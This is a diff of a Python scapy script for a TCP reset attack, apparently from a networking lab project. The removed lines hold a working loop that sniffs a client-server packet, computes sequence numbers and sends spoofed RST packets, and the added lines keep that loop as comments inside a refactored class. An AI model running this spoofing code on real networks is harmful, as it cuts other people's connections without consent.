@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
-import getopt
-import sys
 from scapy.all import *
+from .Client import Client, NetAttrs
 
 
 # giving usage information
@@ -14,75 +13,40 @@ def reset_usage(exit_num=None):
 
 
 # run attack
-def tcp_reset(client_ip, server_ip, intface, tcp_rst_count=5):
+def tcp_reset(client, src, dst, tcp_rst_count=5):
     fin_found = False
 
-    while not fin_found:
-        # capturing a packet with the source and destination provided
-        pack = sniff(iface=intface, count=1, lfilter=lambda x:
-                     x.haslayer(TCP) and
-                     x.haslayer(Raw) and
-                     x[IP].src == client_ip and
-                     x[IP].dst == server_ip and
-                     len(x[TCP].payload) > 0)[0]
+    l0, l1 = client.gen_layers(layers=[0, 1], src=src, dst=dst)
+    l0.show()
+    l1.show()
+    p = l0 / l1
+    p.show()
+    client.add_options(p, {
+        'Ether': {'src' : '0a:00:27:00:00:01', 'dst': '0a:00:27:00:00:01'},
+        'IP' : {'src' : '192.168.1.3', 'dst': '192.168.1.4'}
+        })
+    p.show()
 
-        # calculating sequence numbers
-        max_seq = pack[TCP].seq + tcp_rst_count * pack[TCP].window
-        seqs = range(pack[TCP].seq, max_seq, len(pack[TCP].payload))[1:]
+    # while not fin_found:
+    #     # capturing a packet with the source and destination provided
+    #     pack = sniff(iface=intface, count=1, lfilter=lambda x:
+    #                  x.haslayer(TCP) and
+    #                  x.haslayer(Raw) and
+    #                  x[IP].src == src.ip and
+    #                  x[IP].dst == dst.ip and
+    #                  len(x[TCP].payload) > 0)[0]
 
-        # generating spoofed packets
-        p = IP(src=client_ip, dst=server_ip) / \
-            TCP(sport=pack[TCP].sport, dport=pack[TCP].dport, flags="R")
+    #     # calculating sequence numbers
+    #     max_seq = pack[TCP].seq + tcp_rst_count * pack[TCP].window
+    #     seqs = range(pack[TCP].seq, max_seq, len(pack[TCP].payload))[1:]
 
-        # sending spoofed packets with calculated seq num
-        for seq in seqs:
-            p.seq = seq
-            send(p, verbose=0)
+    #     # generating spoofed packets
+    #     p = IP(src=client_ip, dst=server_ip) / \
+    #         TCP(sport=pack[TCP].sport, dport=pack[TCP].dport, flags="R")
 
-        fin_found = True
+    #     # sending spoofed packets with calculated seq num
+    #     for seq in seqs:
+    #         p.seq = seq
+    #         send(p, verbose=0)
 
-
-# parsing in options
-def main():
-    tcp_rst_count = None
-    client_ip = None
-    server_ip = None
-    intface = None
-
-    try:
-        opts, args = getopt.getopt(
-            sys.argv[1:],
-            "hc:s:i:r",
-            ["help", "client", "server", "interface", "reset_count"]
-        )
-
-    except getopt.GetoptError as err:
-        print("ERROR: {}\n".format(err))
-        usage(2)
-
-    for o, a in opts:
-        if o in ("-s", "--server"):
-            server_ip = a
-        elif o in ("-c", "--client"):
-            client_ip = a
-        elif o in ("-r", "--reset_count"):
-            client_ip = int(a)
-        elif o in ("-i", "--interface"):
-            intface = a
-        elif o in ("-h", "--help"):
-            usage()
-        else:
-            assert False, "unhandled option"
-
-    if not client_ip or not server_ip or not intface:
-        print("ERROR: Server, Client and Interface are required\n")
-        usage(1)
-
-    if not tcp_rst_count:
-        tcp_rst_count = 5
-
-    tcp_reset(client_ip, server_ip, intface, tcp_rst_count)
-
-# main call
-if __name__ == "__main__":
-    main()
+    #     fin_found = True
